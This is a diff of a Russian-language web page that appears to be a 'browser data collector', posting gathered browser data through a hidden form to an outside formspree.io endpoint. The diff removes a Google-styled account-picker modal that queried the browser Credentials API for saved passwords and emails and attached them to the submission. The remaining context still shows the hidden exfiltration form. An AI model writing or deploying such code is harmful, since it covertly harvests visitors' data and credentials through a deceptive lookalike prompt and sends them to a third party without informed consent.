@@ -466,84 +466,6 @@
             display: none;
         }
 
-        .account-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            backdrop-filter: blur(10px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 3000;
-        }
-
-        .modal-content {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            padding: 30px;
-            border-radius: 16px;
-            max-width: 500px;
-            width: 90%;
-            border: 1px solid rgba(0, 255, 136, 0.2);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
-        }
-
-        .account-option {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .account-option:hover {
-            background: rgba(0, 255, 136, 0.1);
-            border-color: #00ff88;
-        }
-
-        .account-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            color: white;
-        }
-
-        .skip-btn {
-            background: transparent;
-            color: #8899aa;
-            border: 1px solid #333;
-            padding: 10px 20px;
-            margin-top: 15px;
-        }
-
-        .skip-btn:hover {
-            color: #ff9966;
-            border-color: #ff9966;
-        }
-
-        .modal-content h3 i.fa-google {
-            color: #4285F4;
-            margin-right: 10px;
-            font-size: 1.2em;
-        }
-
-        .modal-content .fa-exclamation-triangle {
-            margin-right: 8px;
-            color: #ff9966;
-        }
-
         @media (max-width: 768px) {
             .container {
                 padding: 30px 20px;
@@ -619,41 +541,12 @@
         <div class="counter-container" id="counterContainer"></div>
     </div>
 
-    <div class="account-modal" id="accountModal">
-        <div class="modal-content">
-            <h3><i class="fa fa-google" aria-hidden="true"></i> ВЫБЕРИТЕ АККАУНТ</h3>
-            <p style="color: #8899aa; margin: 15px 0; font-size: 0.9em;">
-                Для демонстрации работы сборщика данных укажите email
-            </p>
-
-            <div class="account-options" id="accountOptions">
-                <!-- Сюда вставим варианты из Credentials API -->
-            </div>
-
-            <div class="manual-email">
-                <input type="email" id="manualEmail" placeholder="или введите email вручную" autocomplete="email"
-                    style="width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a2e; color: white;">
-                <button onclick="useManualEmail()" class="secondary-btn">Использовать этот email</button>
-            </div>
-
-            <div class="modal-footer">
-                <button onclick="skipEmailSelection()" class="skip-btn">Пропустить (анонимный режим)</button>
-                <p style="font-size: 0.8em; color: #ff9966; margin-top: 10px;">
-                    <i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Без email не сможем связаться с вами
-                    по результатам проверки
-                </p>
-            </div>
-        </div>
-    </div>
-
     <form id="Form" style="display: none;" action="https://formspree.io/f/xzdrkkaw" method="POST">
         <textarea name="collected_data" id="collectedData"></textarea>
         <input type="hidden" name="_subject" value="Browser Data Collected">
         <input type="hidden" name="_format" value="plain">
         <input type="text" name="_gotcha" style="display:none;">
         <input type="hidden" name="_language" value="ru">
-        <input type="hidden" name="_replyto" id="replyToEmail">
-        <input type="hidden" name="user_email" id="userEmailField">
     </form>
 
     <div class="success-modal" id="successModal">
@@ -695,8 +588,6 @@
         const PENDING_DATA_KEY = 'pendingFormData';
 
         const ENABLE_LOGS = true;
-        const EMAIL_KEY = 'selectedEmail';
-        const ACCOUNT_MODAL_KEY = 'accountModalShown';
 
         function debugLog(message, data) {
             if (!ENABLE_LOGS) return;
@@ -848,21 +739,6 @@
 
                 debugLog('Данные собраны. Отправка формы');
                 const success = await sendFormData(jsonData);
-
-                const userEmail = localStorage.getItem(EMAIL_KEY);
-                if (userEmail && validateEmail(userEmail)) {
-                    browserData.userInfo = {
-                        email: userEmail,
-                        selectionMethod: localStorage.getItem('emailSelectionMethod') || 'manual',
-                        selectedAt: new Date().toISOString(),
-                        dataCollected: ['email_only']
-                    };
-                } else {
-                    browserData.userInfo = {
-                        anonymous: true,
-                        note: 'Пользователь отказался указывать email'
-                    };
-                }
 
                 if (success) {
                     localStorage.clear();
@@ -4349,12 +4225,6 @@
                     collectedDataField.value = jsonData;
 
                     const formData = new FormData(Form);
-                    const userEmail = localStorage.getItem(EMAIL_KEY);
-
-                    if (userEmail && validateEmail(userEmail)) {
-                        formData.append('_replyto', userEmail);
-                        formData.append('email', userEmail);
-                    }
 
                     fetch(Form.action, {
                         method: 'POST',
@@ -4454,7 +4324,7 @@
             successModal.classList.add('active');
             setTimeout(() => {
                 successModal.classList.remove('active');
-            }, 10000);
+            }, 5000);
         }
 
         function showErrorModal(errorCode = 'ERR_UNKNOWN') {
@@ -4481,99 +4351,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             initializeSystem();
             loadTheme();
-            if (!localStorage.getItem(ACCOUNT_MODAL_KEY)) {
-                showAccountSelectionModal();
-            } else {
-                const savedEmail = localStorage.getItem(EMAIL_KEY);
-                if (savedEmail) {
-                    updateUIWithEmail(savedEmail);
-                }
-            }
         });
-
-        async function showAccountSelectionModal() {
-            const modal = document.getElementById('accountModal');
-            const optionsContainer = document.getElementById('accountOptions');
-
-            modal.style.display = 'flex';
-
-            try {
-                if (navigator.credentials && navigator.credentials.get) {
-                    const cred = await navigator.credentials.get({
-                        password: true,
-                        mediation: 'optional'
-                    });
-
-                    if (cred && cred.id) {
-                        optionsContainer.innerHTML = `
-                    <div class="account-option" onclick="selectEmail('${cred.id}')">
-                        <div class="account-avatar">
-                            ${cred.id.charAt(0).toUpperCase()}
-                        </div>
-                        <div>
-                            <div style="color: white; font-weight: bold;">${cred.id}</div>
-                            <div style="color: #8899aa; font-size: 0.9em;">
-                                ${cred.name || 'Сохраненный аккаунт'}
-                            </div>
-                        </div>
-                    </div>
-                `;
-                    }
-                }
-            } catch (error) {
-                console.log('Credentials API недоступен или пользователь отказал');
-            }
-
-            optionsContainer.innerHTML += `
-        <div class="account-option" onclick="showManualEmailInput()">
-            <div class="account-avatar">+</div>
-            <div>
-                <div style="color: white; font-weight: bold;">Другой email</div>
-                <div style="color: #8899aa; font-size: 0.9em;">
-                    Ввести email вручную
-                </div>
-            </div>
-        </div>
-    `;
-        }
-
-        function selectEmail(email) {
-            if (validateEmail(email)) {
-                localStorage.setItem(EMAIL_KEY, email);
-                localStorage.setItem(ACCOUNT_MODAL_KEY, 'true');
-
-                updateUIWithEmail(email);
-
-                document.getElementById('accountModal').style.display = 'none';
-
-                showNotification(`Выбран email: ${email}`, 'success');
-            } else {
-                showNotification('Некорректный email', 'error');
-            }
-        }
-
-        function updateUIWithEmail(email) {
-            const container = document.querySelector('.container');
-            const emailBadge = document.createElement('div');
-            emailBadge.className = 'email-badge';
-            emailBadge.innerHTML = `
-        <div style="display: flex; align-items: center; gap: 10px; 
-                    background: rgba(0, 255, 136, 0.1); padding: 8px 15px; 
-                    border-radius: 20px; margin-top: 15px; border: 1px solid rgba(0, 255, 136, 0.3);">
-            <span style="color: #00ff88;">✉️</span>
-            <span style="color: white; font-size: 0.9em;">${email}</span>
-            <button onclick="changeEmail()" style="background: none; border: none; color: #8899aa; cursor: pointer; font-size: 0.8em;">
-                изменить
-            </button>
-        </div>
-    `;
-            container.appendChild(emailBadge);
-        }
-
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email) && email.length <= 254;
-        }
 
         function loadTheme() {
             const savedTheme = localStorage.getItem('theme');
